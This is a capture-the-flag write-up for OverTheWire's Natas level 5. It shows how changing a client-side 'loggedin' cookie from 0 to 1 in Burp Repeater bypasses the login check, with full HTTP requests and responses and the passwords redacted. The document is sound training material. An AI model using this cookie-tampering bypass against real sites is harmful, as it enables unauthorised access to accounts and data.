# Natas5
#natas #burp-suite #http-header #cookies #authentication-bypass
## Vulnerability:
The application determines wether the user is logged in or no using the `loggedin` value of `Cookie` HTTP header. Since cookies are stored and sent by the client, an attacker can modify the value and bypass the authentication check.
## Technique:
Sent a custom request using **Burp Suite Repeater** and modified the value of the `loggedin` cookie from `0` to `1`.
#### Steps:
###### 1) Investigating the original request and response headers:
**Original request:**
```http
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: _ga=GA1.1.1053878695.1785770772; _ga_RD0K2239G0=GS2.1.s1785770772$o1$g1$t1785770775$j57$l0$h0
Connection: keep-alive
```
**Original response:**
```http
HTTP/1.1 200 OK
Date: Mon, 03 Aug 2026 15:27:28 GMT
Server: Apache/2.4.66 (Ubuntu)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas5",
            "pass": "<NATAS4_PASSWORD>"
        };
    </script>
</head>

<body>
    <h1>natas5</h1>

    <div id="content">
        Access disallowed. You are not logged in
    </div>
</body>
</html>
```
We can notice the `Set-Cookie` header in the response contains `loggedin` value set to 0.
###### 2) Sending custom request
Using burp's repeater, we modified the cookie value to `loggedin=1`:
**Modified request:**
```http
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Cookie: loggedin=1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
**Response:**
```http
HTTP/1.1 200 OK
Date: Mon, 03 Aug 2026 15:33:39 GMT
Server: Apache/2.4.66 (Ubuntu)
Set-Cookie: loggedin=1
Vary: Accept-Encoding
Content-Length: 890
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```
```html
<html>
<head>
    <!-- This stuff in the header has nothing to do with the level -->
    <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css">
    <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css">

    <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
    <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
    <script src="http://natas.labs.overthewire.org/js/wechall.js"></script>

    <script>
        var wechallinfo = {
            "level": "natas5",
            "pass": "<NATAS4_PASSWORD>"
        };
    </script>
</head>

<body>
    <h1>natas5</h1>

    <div id="content">
        Access granted. The password for natas6 is <PASSWORD>
    </div>
</body>
</html>
```

> [!NOTE] Cookie vs Set-Cookie
> - `Cookie` is a **request header** sent by the **client (browser)** to the server. It contains cookies previously stored by the browser.
> - `Set-Cookie` is a **response header** sent by the **server** to instruct the browser to create or update a cookie.
>
> **Flow:**
> ```text
> Server  ── Set-Cookie: loggedin=1 ──► Browser
> Browser ── Cookie: loggedin=1 ─────► Server
> ```

## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas4](./Natas4.md)
## Next Level:
[Natas6](./Natas6.md)
